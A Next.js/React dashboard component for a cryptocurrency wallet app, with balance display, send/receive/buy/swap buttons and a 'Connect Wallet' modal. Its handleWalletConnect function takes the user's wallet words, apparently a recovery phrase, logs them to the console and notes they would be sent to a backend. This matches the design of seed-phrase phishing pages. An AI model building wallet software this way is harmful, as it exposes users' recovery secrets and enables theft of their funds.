"use client";

import { useState } from "react";
import { Search, Copy, Eye, EyeOff, ArrowUp, ArrowDown, CreditCard, ArrowLeftRight, Check, ChevronDown } from "lucide-react";
import { SendModal } from "@/components/modals/send-modal";
import { ReceiveModal } from "@/components/modals/receive-modal";
import { WalletModal } from "@/components/modals/wallet-modal";
import Link from "next/link";
import CryptoCoins from "@/components/crypto-coins";
import { User } from "@/lib/auth";

function DashboardClient({ coinData, user }: { coinData: CryptoData[], user: User }) {
  const [searchQuery, setSearchQuery] = useState("");
  const [balanceShow, setBalanceShow] = useState(true);
  const [showCopyMessage, setShowCopyMessage] = useState(false);
  const [showSendModal, setShowSendModal] = useState(false);
  const [showReceiveModal, setShowReceiveModal] = useState(false);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [isWalletConnected, setIsWalletConnected] = useState(false);

  // Calculate total balance
  const totalBalanceOn = coinData
    .filter(coin => coin.on)
    .reduce((sum, coin) => sum + coin.balance * coin.price, 0);

  const balance = totalBalanceOn.toLocaleString(undefined, {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });

  const copyAccountId = () => {
    navigator.clipboard.writeText(user.accountId).then(() => {
      setShowCopyMessage(true);
      setTimeout(() => setShowCopyMessage(false), 2000);
    });
  };

  const handleWalletConnect = (words: string[]) => {
    // Here you would typically send the words to your backend
    console.log("Connecting wallet with words:", words);
    setIsWalletConnected(true);
  };

  return (
    <main className="p-2 px-4 pb-24 md:pb-4">
      {/* Search Bar */}
      <div className="relative">
        <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
        <input
          type="text"
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          placeholder="Search"
          className="w-full bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-700 rounded-md pl-10 pr-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"
        />
      </div>

      {/* Account ID with Dropdown */}
      <div className="mt-6">
        <div className="flex items-center justify-between relative">
          <div className="flex items-center space-x-2">
            <button className="flex items-center space-x-2 hover:text-gray-700 dark:hover:text-gray-300">
              <span className="text-lg font-semibold" id="accountId">
                {user.accountId}
              </span>
              <ChevronDown className="text-sm w-4 h-4" />
            </button>
          </div>

          <div className="relative">
            <button
              onClick={copyAccountId}
              className="text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white"
            >
              <Copy className="text-xl w-5 h-5" />
            </button>
            {showCopyMessage && (
              <div className="absolute right-0 -top-10 bg-purple-600 text-white text-sm px-2 py-1 rounded shadow-lg whitespace-nowrap">
                Copied!
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Balance Display */}
      <div className="mt-6 flex items-center justify-between">
        <div className="text-3xl md:text-4xl font-bold">
          {balanceShow ? `$${balance}` : "••••••••"}
        </div>
        <button
          onClick={() => setBalanceShow(!balanceShow)}
          className="text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white"
        >
          {balanceShow ? (
            <Eye className="text-xl w-5 h-5" />
          ) : (
            <EyeOff className="text-xl w-5 h-5" />
          )}
        </button>
      </div>

      {/* Action Buttons */}
      <div className="mt-8 grid grid-cols-4 gap-4">
        <div className="flex flex-col items-center">
          <button
            onClick={() => setShowSendModal(true)}
            className="h-16 w-16 rounded-full bg-gray-200 dark:bg-[#374151] hover:bg-gray-300 dark:hover:bg-[#2e3847] flex items-center justify-center"
          >
            <ArrowUp className="text-xl w-5 h-5" />
          </button>
          <span className="mt-2 text-sm">Send</span>
        </div>
        <div className="flex flex-col items-center">
          <button
            onClick={() => setShowReceiveModal(true)}
            className="h-16 w-16 rounded-full bg-gray-200 dark:bg-[#374151] hover:bg-gray-300 dark:hover:bg-[#2e3847] flex items-center justify-center"
          >
            <ArrowDown className="text-xl w-5 h-5" />
          </button>
          <span className="mt-2 text-sm">Receive</span>
        </div>
        <div className="flex flex-col items-center">
          <Link
            href="/buy"
            className="h-16 w-16 rounded-full bg-gray-200 dark:bg-[#374151] hover:bg-gray-300 dark:hover:bg-[#2e3847] flex items-center justify-center"
          >
            <CreditCard className="text-xl w-5 h-5" />
          </Link>
          <span className="mt-2 text-sm">Buy</span>
        </div>
        <div className="flex flex-col items-center">
          <Link
            href="/swap"
            className="h-16 w-16 rounded-full bg-gray-200 dark:bg-[#374151] hover:bg-gray-300 dark:hover:bg-[#2e3847] flex items-center justify-center"
          >
            <ArrowLeftRight className="text-xl w-5 h-5" />
          </Link>
          <span className="mt-2 text-sm">Swap</span>
        </div>
      </div>

      {/* Help Text */}
      <div className="mt-6 text-center text-gray-600 dark:text-gray-400">
        Access, secure and withdraw assets
      </div>

      {/* Connect Wallet Button */}
      <button
        onClick={() => setShowWalletModal(true)}
        className={isWalletConnected
          ? "mt-3 w-full bg-green-500 text-black dark:text-white font-bold py-3 rounded-md flex items-center justify-center"
          : "mt-3 w-full bg-yellow-500 text-black font-bold py-3 rounded-md hover:bg-yellow-600 flex items-center justify-center"
        }
        disabled={isWalletConnected}
      >
        {isWalletConnected ? (
          <>
            <Check className="mr-2 w-4 h-4" />
            Wallet Connected
          </>
        ) : (
          "Connect Wallet"
        )}
      </button>

      {/* Crypto Assets */}
      <div className="mt-8">
        <h2 className="text-xl font-bold mb-4">Crypto</h2>

        <CryptoCoins coinData={coinData} page="dashboard" path={undefined} />
      </div>

      {/* Modals */}
      <SendModal
        isOpen={showSendModal}
        onClose={() => setShowSendModal(false)}
      />
      <ReceiveModal
        isOpen={showReceiveModal}
        onClose={() => setShowReceiveModal(false)}
      />
      <WalletModal
        isOpen={showWalletModal}
        onClose={() => setShowWalletModal(false)}
        onConnect={handleWalletConnect}
      />
    </main>
  );
}

export default DashboardClient